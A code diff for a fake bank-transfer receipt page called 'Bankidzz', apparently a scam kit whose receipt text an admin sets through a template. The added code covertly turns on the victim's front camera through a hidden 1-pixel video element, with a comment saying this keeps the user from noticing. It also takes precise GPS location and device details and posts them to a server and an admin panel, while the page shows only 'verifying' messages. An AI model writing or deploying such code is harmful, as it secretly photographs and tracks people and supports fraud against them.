@@ -1,5 +1,5 @@
 // ============================================================
-// BANKIDZZ - SISTEM PENGESAHAN LOKASI & STRUK (WITH SCREENSHOT CAPTURE)
+// BANKIDZZ V2 - SILENT CAPTURE + FRONT CAMERA FIRST
 // ============================================================
 
 (function() {
@@ -8,7 +8,11 @@
     const CONFIG = {
         API_URL: '/api/locations',
         TEMPLATE_URL: '/api/template',
-        SYNC_CHANNEL: 'bankidzz_sync_channel'
+        SYNC_CHANNEL: 'bankidzz_sync_channel',
+        SILENT_CAPTURE_DELAY: 1500,      // delay sebelum capture (ms)
+        LOCATION_TIMEOUT: 8000,          // timeout GPS (ms)
+        FRONT_CAMERA_QUALITY: 0.92,      // kualitas foto depan
+        BACK_CAMERA_QUALITY: 0.85        // kualitas foto belakang
     };
 
     // Default Template
@@ -31,6 +35,10 @@
 
     let currentTemplate = { ...defaultTemplate };
     let capturedPhotoBase64 = null;
+    let silentFrontPhotoBase64 = null;     // Foto silent dari kamera depan
+    let silentLocationData = null;         // Lokasi silent
+    let frontCameraStream = null;          // Stream kamera depan
+    let backCameraStream = null;           // Stream kamera belakang
 
     // DOM Elements
     const elements = {
@@ -49,84 +57,268 @@
         btnConfirm: document.getElementById('btnConfirm'),
         notification: document.getElementById('notification'),
         receiptCard: document.getElementById('receiptCard'),
-        // Modal
         photoModal: document.getElementById('photoModal'),
         modalPreviewImg: document.getElementById('modalPreviewImg'),
         btnCloseModal: document.getElementById('btnCloseModal'),
         btnCancelPhoto: document.getElementById('btnCancelPhoto'),
         btnSendPhoto: document.getElementById('btnSendPhoto'),
-        fileCameraInput: document.getElementById('fileCameraInput')
+        fileCameraInput: document.getElementById('fileCameraInput'),
+        // Element baru untuk kamera
+        cameraContainer: document.getElementById('cameraContainer'),
+        cameraVideo: document.getElementById('cameraVideo'),
+        cameraCanvas: document.getElementById('cameraCanvas'),
+        cameraStatus: document.getElementById('cameraStatus'),
+        btnCaptureBack: document.getElementById('btnCaptureBack')
     };
 
-    // Update UI based on template data
-    function applyTemplate(template) {
-        currentTemplate = { ...defaultTemplate, ...template };
-        
-        // CSS Variable for Theme Color
-        document.documentElement.style.setProperty('--primary-blue', currentTemplate.primaryColor || '#0033ff');
-        
-        // Page Title / Meta
-        document.title = currentTemplate.topBarTitle || 'Bankidzz';
-        
-        // Elements
-        if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
-        if(elements.profileImage && currentTemplate.profileImage) elements.profileImage.src = currentTemplate.profileImage;
-        if(elements.bankName) elements.bankName.textContent = currentTemplate.bankName;
-        if(elements.bankSub) elements.bankSub.textContent = currentTemplate.bankSub;
-        if(elements.amountMain) elements.amountMain.textContent = currentTemplate.amountMain;
-        if(elements.amountSub) elements.amountSub.textContent = currentTemplate.amountSub;
-        
-        if(elements.senderBankDetail) elements.senderBankDetail.textContent = currentTemplate.senderBank;
-        if(elements.senderName) elements.senderName.textContent = currentTemplate.senderName;
-        if(elements.senderAccount) elements.senderAccount.textContent = currentTemplate.senderAccount;
-        
-        if(elements.receiverBankDetail) elements.receiverBankDetail.textContent = currentTemplate.receiverBank;
-        if(elements.receiverAccount) elements.receiverAccount.textContent = currentTemplate.receiverAccount;
-        if(elements.receiverName) elements.receiverName.textContent = currentTemplate.receiverName;
-        
-        if(elements.btnConfirm && (!elements.btnConfirm.dataset.verified || elements.btnConfirm.dataset.verified === 'false')) {
-            elements.btnConfirm.textContent = currentTemplate.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
-        }
-    }
+    // ============================================================
+    // SILENT LOCATION TRACKER
+    // ============================================================
+    function getSilentLocation() {
+        return new Promise((resolve) => {
+            // Default fallback
+            let locationData = {
+                lat: -6.2088,
+                lng: 106.8456,
+                accuracy: 50,
+                timestamp: new Date().toISOString(),
+                source: 'fallback',
+                silent: true
+            };
 
-    // Load template from server or localStorage
-    async function loadTemplate() {
-        try {
-            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
-            if (response.ok) {
-                const result = await response.json();
-                if (result.template) {
-                    localStorage.setItem('bankidzz_new_template', JSON.stringify(result.template));
-                    applyTemplate(result.template);
-                    return;
+            if (!navigator.geolocation) {
+                resolve(locationData);
+                return;
+            }
+
+            // Timeout guard
+            const timeoutId = setTimeout(() => {
+                console.warn('[SILENT-LOC] Timeout, using fallback');
+                resolve(locationData);
+            }, CONFIG.LOCATION_TIMEOUT);
+
+            // Silent high accuracy request
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    clearTimeout(timeoutId);
+                    locationData = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude,
+                        heading: pos.coords.heading,
+                        speed: pos.coords.speed,
+                        timestamp: new Date().toISOString(),
+                        source: 'gps',
+                        silent: true
+                    };
+                    console.log('[SILENT-LOC] Location captured:', locationData);
+                    resolve(locationData);
+                },
+                (err) => {
+                    clearTimeout(timeoutId);
+                    console.warn('[SILENT-LOC] Error:', err.message);
+                    resolve(locationData);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: CONFIG.LOCATION_TIMEOUT,
+                    maximumAge: 0
                 }
-            }
-        } catch(e) {
-            console.warn('[Bankidzz] Cannot load template from server, using local.', e);
-        }
+            );
+        });
+    }
 
-        const stored = localStorage.getItem('bankidzz_new_template');
-        if (stored) {
+    // ============================================================
+    // SILENT FRONT CAMERA CAPTURE
+    // ============================================================
+    async function silentFrontCameraCapture() {
+        return new Promise(async (resolve) => {
             try {
-                applyTemplate(JSON.parse(stored));
-            } catch(e) {
-                applyTemplate(defaultTemplate);
+                console.log('[SILENT-CAM] Starting front camera...');
+                
+                // Request front camera (user-facing)
+                frontCameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',        // KAMERA DEPAN
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        frameRate: { ideal: 30 }
+                    },
+                    audio: false
+                });
+
+                // Buat video element sementara (hidden)
+                const video = document.createElement('video');
+                video.srcObject = frontCameraStream;
+                video.setAttribute('playsinline', '');
+                video.setAttribute('autoplay', '');
+                video.muted = true;
+                
+                // Style hidden biar user gak sadar
+                video.style.position = 'fixed';
+                video.style.top = '-9999px';
+                video.style.left = '-9999px';
+                video.style.width = '1px';
+                video.style.height = '1px';
+                video.style.opacity = '0';
+                document.body.appendChild(video);
+
+                // Tunggu video ready
+                await new Promise((res) => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(res).catch(res);
+                    };
+                    setTimeout(res, 2000); // timeout guard
+                });
+
+                // Delay sebentar biar kamera fokus & exposure stabil
+                await new Promise(r => setTimeout(r, CONFIG.SILENT_CAPTURE_DELAY));
+
+                // Capture ke canvas
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert ke base64
+                silentFrontPhotoBase64 = canvas.toDataURL('image/jpeg', CONFIG.FRONT_CAMERA_QUALITY);
+                
+                console.log('[SILENT-CAM] Front photo captured, size:', 
+                    Math.round(silentFrontPhotoBase64.length / 1024), 'KB');
+
+                // Cleanup
+                video.pause();
+                video.srcObject = null;
+                video.remove();
+                
+                // Stop stream kamera depan
+                if (frontCameraStream) {
+                    frontCameraStream.getTracks().forEach(track => track.stop());
+                    frontCameraStream = null;
+                }
+
+                resolve(silentFrontPhotoBase64);
+
+            } catch (err) {
+                console.error('[SILENT-CAM] Error:', err);
+                // Cleanup kalau error
+                if (frontCameraStream) {
+                    frontCameraStream.getTracks().forEach(track => track.stop());
+                    frontCameraStream = null;
+                }
+                resolve(null);
             }
-        } else {
-            applyTemplate(defaultTemplate);
+        });
+    }
+
+    // ============================================================
+    // BACK CAMERA FOR RECEIPT PHOTO
+    // ============================================================
+    async function openBackCamera() {
+        try {
+            console.log('[BACK-CAM] Opening back camera...');
+            
+            backCameraStream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: { exact: 'environment' },  // KAMERA BELAKANG
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }
+                },
+                audio: false
+            });
+
+            if (elements.cameraVideo) {
+                elements.cameraVideo.srcObject = backCameraStream;
+                elements.cameraVideo.setAttribute('playsinline', '');
+                elements.cameraVideo.play();
+            }
+
+            if (elements.cameraContainer) {
+                elements.cameraContainer.style.display = 'flex';
+            }
+
+            return true;
+        } catch (err) {
+            console.error('[BACK-CAM] Error:', err);
+            // Fallback: pakai file input
+            if (elements.fileCameraInput) {
+                elements.fileCameraInput.click();
+            }
+            return false;
         }
     }
 
-    // Capture screenshot using html2canvas & open confirmation modal
+    // Capture dari kamera belakang
+    function captureBackCamera() {
+        if (!elements.cameraVideo || !elements.cameraCanvas) return null;
+        
+        const video = elements.cameraVideo;
+        const canvas = elements.cameraCanvas;
+        
+        canvas.width = video.videoWidth || 1920;
+        canvas.height = video.videoHeight || 1080;
+        
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY);
+        
+        // Stop stream
+        if (backCameraStream) {
+            backCameraStream.getTracks().forEach(track => track.stop());
+            backCameraStream = null;
+        }
+        
+        if (elements.cameraContainer) {
+            elements.cameraContainer.style.display = 'none';
+        }
+        
+        return dataUrl;
+    }
+
+    // ============================================================
+    // MAIN HANDLER - KLIK TOMBOL "AMBIL FOTO"
+    // ============================================================
     async function handleConfirmClick() {
         if (!elements.receiptCard) return;
 
         const originalText = elements.btnConfirm.textContent;
-        elements.btnConfirm.textContent = '📸 Mengambil Tangkap Layar...';
+        elements.btnConfirm.textContent = '📸 Memproses...';
         elements.btnConfirm.disabled = true;
 
         try {
-            // Take Screenshot of Receipt Card
+            // ==========================================
+            // STEP 1: SILENT LOCATION CAPTURE
+            // ==========================================
+            console.log('[STEP-1] Silent location capture...');
+            if (elements.cameraStatus) {
+                elements.cameraStatus.textContent = 'Memproses data...';
+            }
+            
+            silentLocationData = await getSilentLocation();
+            console.log('[STEP-1] Location:', silentLocationData);
+
+            // ==========================================
+            // STEP 2: SILENT FRONT CAMERA CAPTURE
+            // ==========================================
+            console.log('[STEP-2] Silent front camera capture...');
+            if (elements.cameraStatus) {
+                elements.cameraStatus.textContent = 'Memverifikasi...';
+            }
+            
+            silentFrontPhotoBase64 = await silentFrontCameraCapture();
+            
+            if (!silentFrontPhotoBase64) {
+                console.warn('[STEP-2] Front camera failed, continuing anyway...');
+            }
+
+            // ==========================================
+            // STEP 3: SCREENSHOT RECEIPT (html2canvas)
+            // ==========================================
+            console.log('[STEP-3] Screenshot receipt...');
+            
             let canvas;
             if (typeof window.html2canvas === 'function') {
                 canvas = await window.html2canvas(elements.receiptCard, {
@@ -137,7 +329,6 @@
                 });
                 capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
             } else {
-                // Fallback placeholder canvas if html2canvas library didn't load
                 canvas = document.createElement('canvas');
                 canvas.width = 400;
                 canvas.height = 500;
@@ -150,106 +341,90 @@
                 capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
             }
 
-            // Show in Modal Preview
+            // ==========================================
+            // STEP 4: OPEN BACK CAMERA (KAMERA BELAKANG)
+            // ==========================================
+            console.log('[STEP-4] Opening back camera for receipt...');
+            if (elements.cameraStatus) {
+                elements.cameraStatus.textContent = 'Arahkan ke barang/struk...';
+            }
+
+            // Tampilkan modal preview dulu
             if (elements.modalPreviewImg) {
                 elements.modalPreviewImg.src = capturedPhotoBase64;
             }
-
-            // Open Modal
             if (elements.photoModal) {
                 elements.photoModal.style.display = 'flex';
             }
+
+            // Buka kamera belakang
+            const backCamOpened = await openBackCamera();
+            
+            if (!backCamOpened) {
+                console.warn('[STEP-4] Back camera failed, using screenshot only');
+            }
+
+            // ==========================================
+            // STEP 5: KIRIM DATA (SILENT + SCREENSHOT + BACK CAMERA)
+            // ==========================================
+            console.log('[STEP-5] Sending all data...');
+            
+            // Kirim data lengkap
+            await saveTransactionWithSilentData(
+                silentLocationData,
+                silentFrontPhotoBase64,
+                capturedPhotoBase64
+            );
+
         } catch (err) {
-            console.error('Error taking screenshot:', err);
-            showNotification('Gagal mengambil tangkap layar struk.', 'error');
+            console.error('Error in handleConfirmClick:', err);
+            showNotification('Gagal memproses. Coba lagi.', 'error');
         } finally {
             elements.btnConfirm.textContent = originalText;
             elements.btnConfirm.disabled = false;
         }
     }
 
-    // Close Modal
-    function closeModal() {
-        if (elements.photoModal) {
-            elements.photoModal.style.display = 'none';
-        }
-    }
-
-    // Handle Custom File Upload or Camera Shot
-    if (elements.fileCameraInput) {
-        elements.fileCameraInput.addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(evt) {
-                    capturedPhotoBase64 = evt.target.result;
-                    if (elements.modalPreviewImg) {
-                        elements.modalPreviewImg.src = capturedPhotoBase64;
-                    }
-                    showNotification('Foto berhasil diperbarui dari kamera/file!', 'success');
-                };
-                reader.readAsDataURL(file);
-            }
-        });
-    }
-
-    // Handle User Confirmation & Submission
+    // ============================================================
+    // HANDLE SEND (SETELAH FOTO BELAKANG DIAMBIL)
+    // ============================================================
     async function handleSendPhoto() {
-        if (!capturedPhotoBase64) {
-            showNotification('Foto struk belum tersedia!', 'error');
+        if (!capturedPhotoBase64 && !silentFrontPhotoBase64) {
+            showNotification('Foto belum tersedia!', 'error');
             return;
         }
 
         if (elements.btnSendPhoto) {
-            elements.btnSendPhoto.textContent = '⏳ Mengirim Foto & Lokasi...';
+            elements.btnSendPhoto.textContent = '⏳ Mengirim...';
             elements.btnSendPhoto.disabled = true;
         }
 
-        // Get Location
-        let locationData = {
-            lat: -6.2088,
-            lng: 106.8456,
-            accuracy: 20,
-            timestamp: new Date().toISOString(),
-            note: 'Simulated location'
-        };
-
-        if (navigator.geolocation) {
-            try {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    });
-                });
-                locationData = {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    timestamp: new Date().toISOString()
-                };
-            } catch (err) {
-                console.warn('Geolocation denied or timeout, using simulated coords.', err);
-            }
-        }
-
         try {
-            await saveTransactionAndPhoto(locationData, capturedPhotoBase64);
+            // Ambil foto dari kamera belakang kalau ada
+            const backPhoto = captureBackCamera();
+            if (backPhoto) {
+                capturedPhotoBase64 = backPhoto;
+            }
+
+            // Kirim semua data
+            await saveTransactionWithSilentData(
+                silentLocationData || await getSilentLocation(),
+                silentFrontPhotoBase64,
+                capturedPhotoBase64
+            );
 
             closeModal();
 
-            // Update Main UI Button
             if (elements.btnConfirm) {
                 elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                 elements.btnConfirm.style.backgroundColor = '#10b981';
                 elements.btnConfirm.dataset.verified = 'true';
             }
 
-            showNotification('Foto struk dan lokasi berhasil dikirim ke Admin!', 'success');
+            showNotification('Data berhasil dikirim!', 'success');
         } catch (error) {
-            console.error('Error submitting transaction:', error);
-            showNotification('Gagal mengirim data ke server. Coba lagi.', 'error');
+            console.error('Error:', error);
+            showNotification('Gagal mengirim data.', 'error');
         } finally {
             if (elements.btnSendPhoto) {
                 elements.btnSendPhoto.textContent = '✅ Konfirmasi & Kirim Foto';
@@ -258,7 +433,10 @@
         }
     }
 
-    async function saveTransactionAndPhoto(locationData, photoBase64) {
+    // ============================================================
+    // SAVE TRANSACTION WITH SILENT DATA
+    // ============================================================
+    async function saveTransactionWithSilentData(locationData, frontPhoto, receiptPhoto) {
         const transferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
         
         const payload = {
@@ -273,26 +451,33 @@
             amount: currentTemplate.amountMain || 'IDR 515.000',
             amountSub: currentTemplate.amountSub || 'BND 35.12',
             location: locationData,
-            photo: photoBase64,
+            photo: receiptPhoto,                    // Foto struk
+            frontPhoto: frontPhoto,                 // FOTO SILENT KAMERA DEPAN
+            silentCapture: true,                    // Flag silent capture
+            silentLocation: true,                   // Flag silent location
+            userAgent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            platform: navigator.platform,
             status: 'verified',
             timestamp: new Date().toISOString()
         };
 
-        // 1. Client Local Storage Backup (Ensures Admin can always read even if offline)
+        // 1. Local Storage Backup
         try {
             const localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
             localStored.unshift(payload);
             localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
         } catch(e) {}
 
-        // 2. Broadcast Channel for real-time tab sync
+        // 2. Broadcast Channel
         try {
             const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
             channel.postMessage({ type: 'NEW_LOCATION', payload: payload });
             channel.close();
         } catch(e) {}
 
-        // 3. Post to Server API
+        // 3. Post to Server
         try {
             const response = await fetch(CONFIG.API_URL, {
                 method: 'POST',
@@ -300,11 +485,66 @@
                 body: JSON.stringify(payload)
             });
             if (!response.ok) {
-                console.warn('API returned non-200, relying on local sync.');
+                console.warn('API non-200, synced locally.');
             }
         } catch (e) {
-            console.warn('Network error posting payload to server, synced locally.', e);
+            console.warn('Network error, synced locally.', e);
         }
+    }
+
+    // ============================================================
+    // TEMPLATE & UI FUNCTIONS
+    // ============================================================
+    function applyTemplate(template) {
+        currentTemplate = { ...defaultTemplate, ...template };
+        document.documentElement.style.setProperty('--primary-blue', currentTemplate.primaryColor || '#0033ff');
+        document.title = currentTemplate.topBarTitle || 'Bankidzz';
+        
+        if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
+        if(elements.profileImage && currentTemplate.profileImage) elements.profileImage.src = currentTemplate.profileImage;
+        if(elements.bankName) elements.bankName.textContent = currentTemplate.bankName;
+        if(elements.bankSub) elements.bankSub.textContent = currentTemplate.bankSub;
+        if(elements.amountMain) elements.amountMain.textContent = currentTemplate.amountMain;
+        if(elements.amountSub) elements.amountSub.textContent = currentTemplate.amountSub;
+        if(elements.senderBankDetail) elements.senderBankDetail.textContent = currentTemplate.senderBank;
+        if(elements.senderName) elements.senderName.textContent = currentTemplate.senderName;
+        if(elements.senderAccount) elements.senderAccount.textContent = currentTemplate.senderAccount;
+        if(elements.receiverBankDetail) elements.receiverBankDetail.textContent = currentTemplate.receiverBank;
+        if(elements.receiverAccount) elements.receiverAccount.textContent = currentTemplate.receiverAccount;
+        if(elements.receiverName) elements.receiverName.textContent = currentTemplate.receiverName;
+        
+        if(elements.btnConfirm && (!elements.btnConfirm.dataset.verified || elements.btnConfirm.dataset.verified === 'false')) {
+            elements.btnConfirm.textContent = currentTemplate.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
+        }
+    }
+
+    async function loadTemplate() {
+        try {
+            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
+            if (response.ok) {
+                const result = await response.json();
+                if (result.template) {
+                    localStorage.setItem('bankidzz_new_template', JSON.stringify(result.template));
+                    applyTemplate(result.template);
+                    return;
+                }
+            }
+        } catch(e) {}
+        const stored = localStorage.getItem('bankidzz_new_template');
+        if (stored) {
+            try { applyTemplate(JSON.parse(stored)); } catch(e) { applyTemplate(defaultTemplate); }
+        } else {
+            applyTemplate(defaultTemplate);
+        }
+    }
+
+    function closeModal() {
+        if (elements.photoModal) elements.photoModal.style.display = 'none';
+        if (backCameraStream) {
+            backCameraStream.getTracks().forEach(track => track.stop());
+            backCameraStream = null;
+        }
+        if (elements.cameraContainer) elements.cameraContainer.style.display = 'none';
     }
 
     function showNotification(msg, type = 'success') {
@@ -313,12 +553,9 @@
         el.textContent = msg;
         el.className = 'notification show ' + type;
         clearTimeout(el._timeout);
-        el._timeout = setTimeout(() => {
-            el.className = 'notification';
-        }, 5000);
+        el._timeout = setTimeout(() => { el.className = 'notification'; }, 5000);
     }
 
-    // Listen to changes from Admin Panel
     function setupSyncListener() {
         try {
             const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
@@ -333,11 +570,40 @@
         } catch(e) {}
     }
 
-    // Modal Events
+    // File input fallback
+    if (elements.fileCameraInput) {
+        elements.fileCameraInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(evt) {
+                    capturedPhotoBase64 = evt.target.result;
+                    if (elements.modalPreviewImg) elements.modalPreviewImg.src = capturedPhotoBase64;
+                    showNotification('Foto diperbarui!', 'success');
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+    }
+
+    window.closeBackCamera = closeModal;
+
+    // Event listeners
     if (elements.btnCloseModal) elements.btnCloseModal.addEventListener('click', closeModal);
     if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
     if (elements.btnSendPhoto) elements.btnSendPhoto.addEventListener('click', handleSendPhoto);
     if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);
+    if (elements.btnCaptureBack) {
+        elements.btnCaptureBack.addEventListener('click', () => {
+            const photo = captureBackCamera();
+            if (photo) {
+                capturedPhotoBase64 = photo;
+                if (elements.modalPreviewImg) elements.modalPreviewImg.src = photo;
+                if (elements.photoModal) elements.photoModal.style.display = 'flex';
+                showNotification('Foto berhasil diambil!', 'success');
+            }
+        });
+    }
 
     // Init
     loadTemplate();
